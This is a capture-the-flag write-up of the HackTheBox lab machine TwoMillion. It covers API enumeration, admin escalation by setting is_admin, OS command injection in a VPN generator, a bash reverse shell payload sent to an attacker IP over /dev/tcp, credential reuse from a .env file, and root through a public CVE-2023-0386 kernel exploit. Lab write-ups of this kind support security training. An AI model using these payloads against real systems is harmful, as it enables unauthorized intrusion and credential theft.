# TwoMillion

**By Stager** | FashilHack

---
## What is this machine

TwoMillion is a retired Linux box on HackTheBox. The entire web application is a recreation of the original HTB platform — the one that existed before the current site. The invite system, the dashboard, the VPN generation, all of it is modelled after how the real HTB used to work. Which means to get in, you have to do what people did to get into the real HTB back in the day — hack your way past the invite page.

This machine is about reading. Every single step comes from either reading JavaScript, reading API responses, or reading configuration files that were left in places they should not be. Nobody dropped a weaponized exploit into a login form. You had to think through what the application was doing and use it against itself.

---

## Target

```
IP:     10.129.229.66
Domain: 2million.htb
OS:     Linux (Ubuntu 22.04)
```

---

## Step 1 — Nmap

Started with a full aggressive scan to see what we are working with.

```bash
sudo nmap -T4 -sV -A -Pn 10.129.229.66
```

![[nmap.png]]

Results:

```
PORT   STATE SERVICE
22/tcp open  tcpwrapped   SSH
80/tcp open  tcpwrapped   HTTP (nginx)

OS: Linux 4.15 - 5.19
Redirect: http://2million.htb/
```

Two ports. SSH is there but locked until we have credentials. The web server on port 80 redirects everything to `2million.htb` so the first thing to do is add it to the hosts file.

```bash
echo '10.129.229.66 2million.htb' >> /etc/hosts
```

Before opening the browser I grabbed the response headers with curl to understand what the server is telling us about itself.

```bash
curl -i http://2million.htb
```

![[response_header.png]]

```
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=a2naod0svconcrk79t4v4jv9e; path=/
```

Two things worth noting. First, nginx is the web server. Second, the `PHPSESSID` cookie confirms this is a PHP application. That session cookie becomes very important later — it is what authenticates us to the API.

There is also something subtle in the headers: `Connection: keep-alive`. The server keeps connections open instead of closing them after each request. This caused problems with Gobuster later.

---

## Step 2 — Gobuster (and why it was annoying)

Ran directory brute forcing before touching the browser.

```bash
gobuster dir \
  -u http://2million.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,txt,php \
  --exclude-length 162 -t 25 --timeout 200s -k
```

![[gobuster_timeout_error_because_parameter_keep_it_alive.png]]

Gobuster immediately started throwing timeout errors on individual words. This was because of the `Connection: keep-alive` header we saw earlier. The server holds connections open and Gobuster's default timeout was too short to handle that. The fix was to increase the timeout to 200 seconds with `--timeout 200s`. The `-k` flag skips TLS certificate verification. The `--exclude-length 162` filters out the wildcard redirect responses.

![[gobuster.png]]

After fixing the parameters, results started coming in:

```
home          (Status: 302)
login         (Status: 200)
register      (Status: 200)
api           (Status: 401)
logout        (Status: 302)
invite        (Status: 200)
Database.php  (Status: 200)
```

The most important findings here are `/api` returning 401 (exists but needs authentication) and `/invite` returning 200 (a real page). Both of those are where the work begins.

---

## Step 3 — The Invite Page and the JavaScript

Opened the browser and went to `http://2million.htb/invite`. The page just says **"Hi! Feel free to hack your way in :)"** with a box to enter an invite code. No hints, no forms, nothing obvious.

The invite code is not generated client-side — something on the server has to make it. That means the JavaScript on this page is communicating with a backend API to handle the invite logic. So I opened the browser DevTools Network tab and looked at what JavaScript files were loading.

![[invite is commecating with that file in api loading.png]]

The Stack Trace tab showed the JavaScript was making calls — specifically to `/js/htb-frontend.min.js` and `/js/inviteapi.min.js`. In the Network tab one file stood out immediately.

downloaded htb-frontend.min.js

```bash
curl -k http://2million.htb/js/htb-frontend.min.js -o frontend.js
```

![[downloaded file.png]]

```
% Total    % Received % Xferd
100 145660  100 145660    0     0   2693    0  0:00:5
inviteapi.min.js   (637 B)   /js/inviteapi.min.js
```
![[found inviteapi js file too.png]]

downloaded `/js/inviteapi.min.js`. too 
![[downloaded file inviteapi.png]]

The filename itself is the clue. This is a dedicated JavaScript file for the invite API. I downloaded the file  JavaScript to read it offline.

Downloaded. Now we have the frontend code locally. Reading through the invite JavaScript, I found it was obfuscated using the classic `eval(function(p,a,c,k,e,d)...)` pattern. This is packed JavaScript — not real encryption, just compression to make it harder to read at a glance. Deobfuscating it revealed two critical function names.

![[two endpoints found.png]]

```
verifyInviteCode  →  url: '/api/v1/invite/verify'
makeInviteCode    →  url: '/api/v1/invite/how/to/generate'
```

These are the two API endpoints the invite page uses. One to verify a code, one to get instructions on how to generate one. That second one is what I needed.

---

## Step 4 — Cracking the Invite Code

### Getting the hint

Hit the generation hint endpoint with curl using POST (the JavaScript told us it uses POST):

```bash
curl -k -X POST http://2million.htb/api/v1/invite/how/to/generate
```

![[got encoded message from server.png]]

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

The server literally tells us the encryption type is ROT13. It is not really encryption — ROT13 just shifts every letter by 13 positions. Took it to CyberChef and decoded it.
![[decoded the message.png]]

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
### Generating the invite code

Now I knew the real endpoint. Hit it:

```bash
curl -k -X POST http://2million.htb/api/v1/invite/generate
```
![[got base64.png]]

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "T1Y0NUgtUE5VUUktNVBSQkEtRktVMDQ=",
    "format": "encoded"
  }
}
```

The code is base64 encoded — the `=` at the end is the giveaway. Decode it:

```bash
echo "T1Y0NUgtUE5VUUktNVBSQkEtRktVMDQ=" | base64 -d
```

![[got invitecode.png]]

```
OV45H-PNUQI-5PRBA-FKU04
```

That is the invite code.
### Registering an account

Entered the code on the `/invite` page which redirected to `/register`.

![[signup with invitation.png]]

Filled in the registration form — username `stager`, email `stager@gmail.com`.

![[registered.png]]

Registered successfully. Then logged in.

![[login.png]]

After login the full HTB dashboard loaded.
![[got in.png]]

We are in as a regular user.

---

## Step 5 — API Enumeration

Now that we have a valid session, the API that was returning 401 before should be accessible. The PHPSESSID cookie from our login is what authenticates us.

I queried the API root to see what routes exist:

```bash
curl http://2million.htb/api/v1 \
  -H 'Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs' | jq .
```

![[found api endpoints we can access.png]]

The response was the entire API route map:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

The admin section immediately stands out. Three endpoints — one to check if you are admin, one to generate VPN configs for specific users, and one PUT endpoint to update user settings. That settings update endpoint is the most interesting because it takes user-supplied data and modifies account properties.

---

## Step 6 — Privilege Escalation (User → Admin)

### Checking current privilege level

I used Burp Suite Repeater to interact with the API more easily. First confirmed my current status by hitting the auth endpoint.

![[user-auth api.png]]

```http
GET /api/v1/user/auth HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
```

Response:

```json
{
  "loggedin": true,
  "username": "stager",
  "is_admin": 0
}
```

`is_admin: 0`. Not an admin. Now I need to fix that.

### Probing the admin settings update endpoint

I sent a PUT request to `/api/v1/admin/settings/update` with an empty JSON body. The server was very helpful:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
Content-Type: application/json

{}
```

before this response i got invalid content type i had to add this `Content-Type: application/json` to get this response 
Response:

```json
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

The server is telling me exactly what parameters it wants. I added `email`, and it asked for `is_admin`. This is the vulnerability — the server trusts the client to supply the `is_admin` value with no authorization check.
![[we updated to admin by setting paramter isadmin to 1.png]]


```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
Content-Type: application/json

{
  "email": "stager@gmail.com",
  "is_admin": 1
}
```

Response:
```json
{
  "id": 13,
  "username": "stager",
  "is_admin": 1
}
```

Done. I told the server I was an admin and it believed me. This is an IDOR — Insecure Direct Object Reference. The server did not verify that the person making the request was actually allowed to elevate their own privileges.

### Confirming admin status
Verified immediately with the admin auth endpoint in Burp:

![[check are you admin we get message true.png]]

```http
GET /api/v1/admin/auth HTTP/1.1
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
```

Response:
```json
{
  "message": true
}
```

We are now admin.

---
## Step 7 — Command Injection in the VPN Generator

### Finding the injection point

With admin privileges I could now hit `POST /api/v1/admin/vpn/generate`. This endpoint generates an OpenVPN config file for a given username. The username gets passed to a shell command to build the config. I tested with a simple injection in Burp Repeater:

![[vpn generation is vuln to command injection.png]]

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
Content-Type: application/json

{"username": "stager;id;"}
```

Response:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The semicolons broke out of the shell command and executed `id` directly. The server returned the output in the HTTP response body. This is textbook OS command injection — the username parameter hits a shell with no sanitization.

### Getting the reverse shell

Set up a netcat listener on my attacker machine:

```bash
nc -lvnp 2233
```

Then sent the reverse shell payload through Burp Repeater:

![[try to get shell.png]]

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=vae7cvb6m0hhs8ii7mmd28nfhs
Content-Type: application/json

{"username": "stager$(bash -c 'bash -i >& /dev/tcp/10.10.17.239/2233 0>&1')"}
```

Netcat caught the connection:

![[got a shell.png]]

```
nc -lvnp 2233
listening on [any] 2233 ...
connect to [10.10.17.239] from (UNKNOWN) [10.129.229.66] 40094
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

We have a shell as `www-data`.

---
## Step 8 — Post Exploitation & Credential Discovery

As `www-data` I am inside the web application directory `/var/www/html`. The first thing to do in any web app compromise is read the configuration files — they almost always contain database credentials.

```bash
ls -la /var/www/html
```

```
-rw-r--r--  Database.php
-rw-r--r--  .env          ← this
drwxr-xr-x  controllers/
drwxr-xr-x  views/
drwxr-xr-x  VPN/
```

The `.env` file is where PHP applications store environment configuration. Read it:

```bash
cat /var/www/html/.env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Credentials in plaintext. Database username `admin`, password `SuperDuperPass123`. On Linux machines people often reuse system passwords for database accounts. I tried SSHing in with these credentials:

```bash
ssh admin@2million.htb
```

Password `SuperDuperPass123` worked. I was now in as `admin` — a real system user, not `www-data`.
![[found env file with creds.png]]

---

## Step 9 — Finding the Path to Root

### Enumerating what admin owns

Standard post-exploitation: check what files belong to this user.

```bash
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```

![[find_things_user_admin_owns.png]]

```
/home/admin
/home/admin/.cache
/home/admin/.ssh
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin          ← this
/dev/pts/0
```

`/var/mail/admin` — there is mail here. That is worth reading.

### Reading the mail

```bash
cd /var/mail
cat admin
```

![[found_massege_in_mail_directory.png]]

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS

Hey admin,

I'm know you're working as fast as you can to do the DB migration.
While we're partially down, can you also upgrade the OS on our web host?
There have been a few serious Linux kernel CVEs already this year.
That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

The mail is pointing directly at the privilege escalation path — an OverlayFS / FUSE kernel vulnerability. This is CVE-2023-0386. The machine is telling you the CVE through the in-game email system.

---

## Step 10 — Privilege Escalation (CVE-2023-0386)

### What is CVE-2023-0386

CVE-2023-0386 is a Linux kernel privilege escalation in the OverlayFS filesystem. OverlayFS is the technology that lets Docker layer filesystems on top of each other. The vulnerability exists because the kernel does not properly validate file capabilities when a file is copied from an unprivileged OverlayFS layer into the upper layer.

The attack works by creating a fake FUSE filesystem, planting a SUID binary inside an OverlayFS overlay on top of it, and triggering the kernel to execute it. The kernel copies the file without stripping its capabilities, giving you root execution. It needs two terminals working simultaneously — one runs the fake filesystem, the other triggers the exploit binary.

### Downloading and building

On my attacker machine I cloned the public PoC:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386
cd CVE-2023-0386
make all
```

Then served it over HTTP and pulled it onto the target:

```bash
# Attacker machine
python3 -m http.server 80

# Target machine
wget http://10.10.17.239/cve-2023-0386.tar.bz2
tar -xjf cve-2023-0386.tar.bz2
```

![[downloaded_kernel_exploit.png]]

The files transferred successfully. You can see both terminals in the screenshot — the attacker serving files on the left and the target pulling them down on the right.

### Running the exploit

The exploit needs two terminals. In **Terminal 1** (on the target):

```bash
cd CVE-2023-0386
./fuse ./ovlcap/lower ./gc
```

In **Terminal 2** (on the target):

```bash
./exp
```

![[exploited.png]]

```
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
[+] ioctl callback
cmd 0x80086601

uid=1000 gid=1000
[+] mount success
total 8
drwxrwxr-x 1 root   root   4096 Apr 15 14:...
drwxrwxr-x 6 root   root   4096 Apr 15 14:...
-rwsrwxrwx 1 nobody nogroup 16096 Jan 1 19...
[+] exploit success!
```

Root shell:

```
root@2million:~/CVE-2023-0386# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json

root@2million:/root# cat root.txt
7a2edb7b87fce7bd9a0c86fc8861054c
```

![[finished.png]]

**TwoMillion solved.**

---

## The Full Attack Chain

```
Nmap → ports 22 and 80, nginx, redirect to 2million.htb
  ↓
Gobuster → found /invite, /api (401), /register, /login
  ↓
Browser DevTools (Network tab) → inviteapi.min.js loading on /invite
  ↓
Downloaded htb-frontend.min.js → deobfuscated eval() packed JS
  ↓
Found two endpoints: /api/v1/invite/how/to/generate and /api/v1/invite/verify
  ↓
curl POST /api/v1/invite/how/to/generate → ROT13 encoded hint
  ↓
CyberChef ROT13 decode → "make a POST request to /api/v1/invite/generate"
  ↓
curl POST /api/v1/invite/generate → base64 encoded invite code
  ↓
base64 -d → OV45H-PNUQI-5PRBA-FKU04 → registered account as stager
  ↓
Logged in → got PHPSESSID session cookie
  ↓
curl GET /api/v1 with cookie → full API route map exposed
  ↓
Burp Suite → GET /api/v1/user/auth → confirmed is_admin: 0
  ↓
Burp Suite → PUT /api/v1/admin/settings/update + {is_admin: 1} → IDOR → admin
  ↓
Burp Suite → GET /api/v1/admin/auth → confirmed {"message": true}
  ↓
Burp Suite → POST /api/v1/admin/vpn/generate + {username: "stager;id;"} → RCE confirmed
  ↓
netcat -lvnp 2233 → sent bash reverse shell payload through Burp
  ↓
Shell as www-data
  ↓
cat /var/www/html/.env → DB_PASSWORD=SuperDuperPass123
  ↓
ssh admin@2million.htb with SuperDuperPass123 → shell as admin
  ↓
find / -user admin → found /var/mail/admin
  ↓
cat /var/mail/admin → OverlayFS / FUSE CVE hint → CVE-2023-0386
  ↓
Downloaded and built CVE-2023-0386 PoC on target
  ↓
Two terminals: ./fuse ./ovlcap/lower ./gc + ./exp → root shell
  ↓
cat /root/root.txt → pwned
```

---

## What I Learned

**Read the JavaScript before you brute force.** Every API endpoint the backend exposes has to be called from somewhere — and that somewhere is the frontend JavaScript. Before running any wordlist, download the JS and read it. The invite API endpoints were sitting there in plain sight inside an obfuscated file. CyberChef or any JS deobfuscator would have shown them instantly.

**The server will tell you what it wants if you ask wrong.** The admin settings update endpoint responded to an empty body by telling me exactly which parameter it was missing. That is not a bug in Burp — that is a bug in the application. Proper API design never reveals internal parameter names to unauthenticated or unauthorized users.

**IDOR is still everywhere.** Setting `is_admin: 1` in the request body and having the server accept it is one of the most common vulnerabilities in real-world applications. The application was trusting the client to determine its own privilege level. No amount of frontend design stops that — it has to be enforced server-side.

**Read every config file in the web root.** The `.env` file is standard in PHP applications and it almost always contains database credentials. From a `www-data` shell, reading the web root is the first thing you do. It worked here and it works in real engagements constantly.

**Mail directories get forgotten.** `/var/mail/admin` gave us the entire privesc path as an in-game email. In real penetration tests, mail directories sometimes contain internal credentials, password reset tokens, and sensitive communications nobody thought to clean up.

**Kernel exploits skip everything.** CVE-2023-0386 does not care about sudo rules, file permissions, or application hardening. When the kernel itself is vulnerable, you go straight to root. Patch your kernels.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._